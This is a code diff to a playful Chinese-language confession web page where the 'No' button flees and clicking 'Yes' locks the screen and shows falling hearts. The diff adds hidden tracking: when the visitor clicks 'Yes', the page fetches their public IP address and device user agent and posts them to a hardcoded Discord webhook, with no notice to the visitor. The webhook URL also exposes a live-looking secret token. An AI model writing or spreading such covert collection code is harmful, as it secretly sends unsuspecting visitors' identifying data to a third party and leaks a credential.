@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>我喜歡妳</title>
+<title>我喜歡你 💖</title>
 
 <style>
 body {
@@ -106,7 +106,7 @@ button {
 .heart {
   position: absolute;
   font-size: 20px;
-  animation: float 3s linear forwards;
+  animation: float 3s linear infinite;
 }
 
 @keyframes float {
@@ -114,10 +114,9 @@ button {
   100% { transform: translateY(-300px); opacity: 0; }
 }
 
-/* 🔒 鎖定狀態 */
+/* 鎖定 */
 .locked {
-  pointer-events: none !important;
-  opacity: 0.9;
+  pointer-events: none;
 }
 </style>
 </head>
@@ -150,14 +149,14 @@ const success = document.getElementById("success");
 
 let locked = false;
 
-// 初始位置
+/* 初始位置 */
 yesBtn.style.left = "40px";
 yesBtn.style.top = "100px";
 
 noBtn.style.left = "160px";
 noBtn.style.top = "100px";
 
-/* ❌ NO 逃跑 */
+/* NO 逃跑 */
 function moveAway(x, y) {
   if (locked) return;
 
@@ -183,26 +182,36 @@ document.addEventListener("touchmove", e => {
   moveAway(e.touches[0].clientX, e.touches[0].clientY);
 });
 
+/* 🌐 IP + 裝置 */
+async function getInfo() {
+  let ip = "unknown";
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    ip = (await res.json()).ip;
+  } catch {}
+
+  const device = navigator.userAgent;
+
+  return { ip, device };
+}
+
 /* 💖 YES */
 yesBtn.onclick = async () => {
+
   if (locked) return;
   locked = true;
 
   success.classList.add("show");
 
-  // 🔒 鎖住整個區域
   area.classList.add("locked");
   yesBtn.disabled = true;
   noBtn.disabled = true;
 
-  yesBtn.style.pointerEvents = "none";
-  noBtn.style.pointerEvents = "none";
-
-  // ❌ 停止逃跑事件
   document.onmousemove = null;
   document.ontouchmove = null;
 
-  /* Discord */
+  const info = await getInfo();
+
   const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";
 
   const embed = {
@@ -213,10 +222,25 @@ yesBtn.onclick = async () => {
         title: "💖 告白成功",
         description: "有人按下『願意』 ❤️",
         color: 0xff4d6d,
+
         fields: [
-          { name: "💘 結果", value: "已鎖定畫面", inline: true },
-          { name: "💞 狀態", value: "不可再操作", inline: true }
+          {
+            name: "🌐 IP",
+            value: info.ip,
+            inline: false
+          },
+          {
+            name: "📱 裝置",
+            value: info.device.slice(0, 80),
+            inline: false
+          },
+          {
+            name: "💘 狀態",
+            value: "已鎖定畫面",
+            inline: true
+          }
         ],
+
         timestamp: new Date().toISOString()
       }
     ]
@@ -230,7 +254,7 @@ yesBtn.onclick = async () => {
     });
   } catch (e) {}
 
-  /* 💖 愛心雨 */
+  /* 💖 愛心動畫 */
   setInterval(() => {
     const heart = document.createElement("div");
     heart.className = "heart";
